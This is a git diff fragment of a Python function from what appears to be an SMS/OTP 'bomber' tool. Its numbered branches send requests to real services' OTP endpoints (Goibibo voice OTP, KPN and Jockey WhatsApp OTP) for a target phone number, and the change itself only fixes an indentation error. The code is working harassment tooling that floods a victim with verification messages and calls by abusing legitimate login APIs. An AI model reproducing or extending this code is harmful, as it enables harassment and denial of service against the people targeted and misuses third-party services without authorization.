@@ -218,7 +218,7 @@ def getapi(pn, index, cc):
         elif index == 90: # Goibibo Voice v2
             return session.post("https://www.goibibo.com/user/voice-otp/generate/", json={"phone": pn}, timeout=5).status_code == 200
             
-                    elif index == 91: # KPN WhatsApp v3
+         elif index == 91: # KPN WhatsApp v3
             return session.post("https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", json={"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": pn}}, timeout=5).status_code == 200
         elif index == 92: # Jockey WhatsApp v3
             return session.get(f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{pn}?whatsapp=true", timeout=5).status_code == 200
